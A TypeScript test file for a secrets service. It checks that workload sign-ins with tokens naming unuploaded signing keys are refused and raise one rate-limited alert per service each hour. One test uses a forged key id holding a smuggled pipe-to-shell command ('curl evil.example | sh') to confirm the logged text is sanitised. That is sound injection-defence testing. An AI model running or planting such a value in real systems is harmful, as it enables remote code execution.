// A sign-in whose token names a key its service's uploaded keys lack
// (T98): most likely its cluster rotated them, and every pod is locked out.
// One `workload.alert` and one delivery to the deployment's `alert`, naming
// the issuer, the key and the fix, at most once an hour per service
// whatever the key, decided by one conditional write outside any
// transaction, so that what anyone can send never reaches the log's head.
import test, { after, before, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { generateKeyPairSync, randomUUID, sign as signWith, type KeyObject } from 'node:crypto';

import { createProof, generateProofKey } from '@coffre/client/dpop';
import { github, signin, type Gate, type WorkloadAlert } from '@coffre/core/identity';
import type { Database } from '@coffre/db';
import { eq, sql } from 'drizzle-orm';

import { UNKNOWN_KEY_ALERT_MS } from '../src/alerts.ts';
import { resolveConfig } from '../src/config.ts';
import { createRuntime, type CoffreRuntime } from '../src/runtime.ts';
import { processLimits } from '../src/workloads/limits.ts';
import { FetchRefused, type WorkloadTransport } from '../src/workloads/transport.ts';
import { contextFor, holdSomething, openTestDatabase, resetDatabase, testDeps, type FixtureDeps } from './api-fixture.ts';
import { auditChainHead, auditLog, cappedAlerts } from './db/tables.ts';
import { postgresOnly } from './db/engine.ts';
import { answer, type Pages } from './start-fixture.ts';

const ORIGIN = 'https://secrets.acme.example';
const ROOT = 'admin@acme.example';
const SERVICE = 'api-prod';
const OTHER = 'worker';
const IP = '203.0.113.9';
const CLUSTER = 'https://kubernetes.default.svc.cluster.local';
const POD = { sub: 'system:serviceaccount:prod:api', 'kubernetes.io': { namespace: 'prod', serviceaccount: { name: 'api', uid: 'b9f0c6a2-7d3e-4c1a-9f00-2c6d5e4b3a10' } } };
const BOUND = { sub: POD.sub, 'kubernetes.io.serviceaccount.uid': POD['kubernetes.io'].serviceaccount.uid };

const part = (value: unknown) => Buffer.from(JSON.stringify(value)).toString('base64url');
const seconds = () => Math.floor(Date.now() / 1000);

let signer: { privateKey: KeyObject; jwk: Record<string, unknown> };
let db: { owner: Database; runtime: Database; close: () => Promise<void> };
let deps: FixtureDeps;
let runtime: CoffreRuntime;
let alerts: WorkloadAlert[];
let background: Promise<unknown>[];
const ui = {} as Pages;

/** A gate that admits every proof: what this file checks is the sign-in. */
const gate: Gate = { nonce: async () => 'n.test', admit: async () => ({ ok: true, nonce: 'n.test' }) };
/** Nothing published: these bindings carry their keys. */
const transport: WorkloadTransport = { json: async (url) => { throw new FetchRefused(url, 'answered 404'); } };

/** A projected service-account token, signed by the cluster's key, its header naming `kid` and `alg`. */
function podToken(kid: unknown, iss = CLUSTER, alg = 'RS256'): string {
  const input = `${part({ alg, kid, typ: 'JWT' })}.${part({ iss, aud: ORIGIN, iat: seconds() - 5, exp: seconds() + 600, jti: randomUUID(), ...POD })}`;
  return `${input}.${signWith('sha256', Buffer.from(input), signer.privateKey).toString('base64url')}`;
}

/** A bearer token for `/api/auth/oidc`, as the same cluster signs it. */
const bearerToken = (kid: string) => podToken(kid);

before(async () => {
  db = await openTestDatabase();
  const { privateKey, publicKey } = generateKeyPairSync('rsa', { modulusLength: 2048 });
  signer = { privateKey, jwk: { ...publicKey.export({ format: 'jwk' }), kid: 'k1', alg: 'RS256', use: 'sig' } };
});

after(async () => {
  await db.close();
});

beforeEach(async () => {
  await resetDatabase(db.owner);
  deps = testDeps(db.runtime, [ROOT]);
  alerts = [];
  background = [];
  const config = resolveConfig({
    publicUrl: ORIGIN,
    vault: deps.vault,
    auth: signin({ providers: [github({ clientId: 'a', clientSecret: 'b' })], workloads: { limits: processLimits({ perSource: 1000, total: 1000 }), alert: (alert) => void alerts.push(alert) } }),
    auditChainKey: deps.chainKey.toString('base64'),
  });
  runtime = createRuntime(config, deps.db, deps.vault, transport, (promise) => void background.push(promise), () => gate);
  deps.signin = runtime.signin!;
  for (const service of [SERVICE, OTHER]) {
    assert.equal((await deps.vault.admit({ actor: `user:${ROOT}`, principal: `token:${service}` })).ok, true);
    await holdSomething(db.owner, deps.vault, `token:${service}`, `user:${ROOT}`);
  }
});

/** A Kubernetes binding of `service` that carries the cluster's one key, `k1`, as `coffre trust --jwks-file` makes it; with no policy, a bearer one. */
async function bindCluster(service = SERVICE, policy: Record<string, unknown> | null = {}): Promise<string> {
  const made = await runtime.workloads!.bind(
    await contextFor(deps, ROOT),
    service,
    { profile: policy === null ? 'custom' : 'kubernetes', issuer: CLUSTER, claims: BOUND as never, label: 'cluster', replaces: [], jwks: { keys: [signer.jwk] } as never, ...(policy === null ? {} : { policy }) },
    { dryRun: false },
  );
  assert.ok('binding' in made);
  return made.binding.id;
}

/** A workload's sign-in at `/api/auth/workload`: its status and reason. */
async function signIn(jwt: string, service = SERVICE): Promise<{ status: number; reason?: string; message?: string }> {
  const url = `${ORIGIN}/api/auth/workload`;
  const key = await generateProofKey();
  const response = await answer(
    new Request(url, { method: 'POST', headers: { 'content-type': 'application/json', dpop: await createProof(key, { method: 'POST', url }) }, body: JSON.stringify({ service: `token:${service}`, proof: { oidc: jwt } }) }),
    runtime, ui, IP,
  );
  const body = (await response.json()) as { reason?: string; message?: string };
  return { status: response.status, reason: body.reason, message: body.message };
}

/** The app's alerts in the log, oldest first. */
async function logged(): Promise<Record<string, unknown>[]> {
  const rows = await db.owner.select({ metadata: auditLog.metadata }).from(auditLog).where(eq(auditLog.action, 'workload.alert')).orderBy(auditLog.seq);
  return rows.map((row) => JSON.parse(row.metadata) as Record<string, unknown>);
}

/** The deployment's deliveries, once the background has run. */
async function delivered(): Promise<WorkloadAlert[]> {
  await Promise.all(background);
  return alerts;
}

/** The process log's lines while `work` runs. */
async function consoleLines<T>(work: () => Promise<T>): Promise<{ result: T; lines: unknown[][] }> {
  const lines: unknown[][] = [];
  const original = console.error;
  console.error = (...args: unknown[]) => void lines.push(args);
  try {
    return { result: await work(), lines };
  } finally {
    console.error = original;
  }
}

test("a token signed by a key the uploaded ones lack alerts the service's managers: the issuer, the key, and the commands that upload them again", async () => {
  const binding = await bindCluster();
  assert.equal((await signIn(podToken('k1'))).status, 200, 'the uploaded key signs in');
  assert.deepEqual(await logged(), []);

  const { result: refused, lines } = await consoleLines(() => signIn(podToken('rotated-2026')));
  assert.equal(refused.status, 401);
  assert.equal(refused.reason, 'unknown_key');
  assert.match(refused.message!, /key rotated-2026 is not among those uploaded for https:\/\/kubernetes\.default\.svc\.cluster\.local/);
  // The process log's line names the key too.
  const line = lines.find(([fields]) => (fields as { event?: string }).event === 'workload_exchange_refused');
  assert.deepEqual(line?.[0], { event: 'workload_exchange_refused', reason: 'unknown_key', service: `token:${SERVICE}`, sourceIp: IP, issuer: CLUSTER, kid: 'rotated-2026' });

  const [entry, ...more] = await logged();
  assert.deepEqual(more, []);
  assert.deepEqual(
    { ...entry, text: undefined },
    { issuer: CLUSTER, kid: 'rotated-2026', kind: 'unknown_key', service: `token:${SERVICE}`, binding, session: null, ip: IP, text: undefined },
  );
  const [alert, ...others] = await delivered();
  assert.deepEqual(others, []);
  assert.deepEqual({ ...alert, text: undefined }, { kind: 'unknown_key', service: `token:${SERVICE}`, binding, session: null, ip: IP, text: undefined });
  assert.equal(alert!.text, entry!.text);
  assert.equal(
    alert!.text,
    `api-prod's sign-in from ${IP} was refused: its token names key "rotated-2026", not one uploaded for ${CLUSTER}. `
      + `If that issuer rotated its keys, upload them again: kubectl get --raw /openid/v1/jwks > keys.json, then coffre trust api-prod --issuer ${CLUSTER} --replace-keys --jwks-file keys.json --apply. `
      + 'Said once an hour at most.',
  );
  const [actor] = await db.owner.select({ actor: auditLog.actor, sourceIp: auditLog.sourceIp }).from(auditLog).where(eq(auditLog.action, 'workload.alert'));
  assert.deepEqual(actor, { actor: `token:${SERVICE}`, sourceIp: IP });
});

test('the cap is per service, whatever the key, two requests at once included, and lifts after the hour', async () => {
  await bindCluster();
  await bindCluster(OTHER);
  // Two at once, each naming a key of its own: one alert.
  const both = await Promise.all([signIn(podToken('forged-a')), signIn(podToken('forged-b'))]);
  assert.deepEqual(both.map(({ reason }) => reason), ['unknown_key', 'unknown_key']);
  assert.equal((await logged()).length, 1);
  // Another key within the hour: refused as quietly.
  for (const kid of ['forged-c', 'forged-d', 'forged-e']) assert.equal((await signIn(podToken(kid))).reason, 'unknown_key');
  assert.equal((await logged()).length, 1);
  // Another service has a cap of its own.
  assert.equal((await signIn(podToken('forged-f'), OTHER)).reason, 'unknown_key');
  assert.deepEqual((await logged()).map(({ service, kid }) => [service, kid]), [[`token:${SERVICE}`, (await logged())[0]!.kid], [`token:${OTHER}`, 'forged-f']]);
  assert.ok(['forged-a', 'forged-b'].includes((await logged())[0]!.kid as string));

  // An hour on, the next alerts again.
  await db.owner.update(cappedAlerts).set({ raisedAt: new Date(Date.now() - UNKNOWN_KEY_ALERT_MS - 1000) }).where(eq(cappedAlerts.service, `token:${SERVICE}`));
  assert.equal((await signIn(podToken('forged-g'))).reason, 'unknown_key');
  assert.deepEqual((await logged()).map(({ kid }) => kid).slice(2), ['forged-g']);
  assert.equal((await delivered()).length, 3);
});

test('a refusal capped out opens no transaction: the one that alerts opens its own', async () => {
  await bindCluster();
  let opened = 0;
  const transaction = deps.db.transaction.bind(deps.db);
  deps.db.transaction = ((work: never, ...rest: never[]) => (opened++, transaction(work, ...rest))) as typeof deps.db.transaction;
  try {
    assert.equal((await signIn(podToken('forged-a'))).reason, 'unknown_key');
    assert.equal(opened, 1, "the alert's entry");
    opened = 0;
    for (const kid of ['forged-b', 'forged-c']) assert.equal((await signIn(podToken(kid))).reason, 'unknown_key');
  } finally {
    deps.db.transaction = transaction;
  }
  assert.equal(opened, 0);
  assert.equal((await logged()).length, 1);
});

test('a refusal capped out answers while another transaction holds the log\'s head', postgresOnly('holds the head with a row lock'), async () => {
  await bindCluster();
  assert.equal((await signIn(podToken('forged-a'))).reason, 'unknown_key');
  let release!: () => void;
  const released = new Promise<void>((resolve) => (release = resolve));
  let held!: () => void;
  const holding = new Promise<void>((resolve) => (held = resolve));
  const holder = db.owner.transaction(async (tx) => {
    await tx.execute(sql`SELECT 1 FROM ${auditChainHead} FOR UPDATE`);
    held();
    await released;
  });
  await holding;
  try {
    const answered = await Promise.race([signIn(podToken('forged-b')), new Promise<null>((resolve) => setTimeout(() => resolve(null), 5000))]);
    assert.equal(answered?.reason, 'unknown_key', 'answered with the head held');
  } finally {
    release();
    await holder;
  }
  assert.equal((await logged()).length, 1);
});

test('only a service with a binding on the issuer counts: an unknown service or issuer writes nothing', async () => {
  await bindCluster();
  assert.equal((await signIn(podToken('forged-a'), 'nobody')).reason, 'no_match');
  assert.equal((await signIn(podToken('forged-a', 'https://elsewhere.example'))).reason, 'no_match');
  assert.deepEqual(await db.owner.select().from(cappedAlerts), []);
  assert.deepEqual(await logged(), []);
  assert.deepEqual(await delivered(), []);
});

test("the key is the token's to name: shown in at most 64 characters a kid uses, and none when it names none", async () => {
  await bindCluster();
  await bindCluster(OTHER);
  const forged = `"; curl evil.example | sh #\n${'x'.repeat(200)}`;
  assert.equal((await signIn(podToken(forged))).reason, 'unknown_key');
  const [entry] = await logged();
  assert.equal(entry!.kid, `???curl?evil.example???sh???${'x'.repeat(36)}…`);
  assert.doesNotMatch(entry!.text as string, /curl evil\.example|\n/);
  // No kid, and an algorithm none of the uploaded keys is for: no key to name.
  assert.equal((await signIn(podToken(undefined, CLUSTER, 'ES256'), OTHER)).reason, 'unknown_key');
  const [, unnamed] = await logged();
  assert.equal(unnamed!.kid, null);
  assert.match(unnamed!.text as string, /its token names no key, not one uploaded for/);
});

test('/api/auth/oidc alerts the same, once an hour per service, for a bearer binding that carries its keys', async () => {
  const binding = await bindCluster(SERVICE, null);
  const exchange = async (kid: string) => {
    const response = await answer(
      new Request(`${ORIGIN}/api/auth/oidc`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ service: `token:${SERVICE}`, token: bearerToken(kid) }) }),
      runtime, ui, IP,
    );
    return ((await response.json()) as { reason?: string }).reason;
  };
  assert.equal(await exchange('k1'), undefined, 'the uploaded key exchanges');
  assert.equal(await exchange('forged-a'), 'unknown_key');
  assert.equal(await exchange('forged-b'), 'unknown_key');
  const entries = await logged();
  assert.deepEqual(entries.map(({ binding: of, kid }) => [of, kid]), [[binding, 'forged-a']]);
  // Not a Kubernetes binding: the alert says to save the issuer's JWKS, without kubectl.
  assert.match(entries[0]!.text as string, /upload them again: save its JWKS as keys\.json, then coffre trust api-prod --issuer/);
});
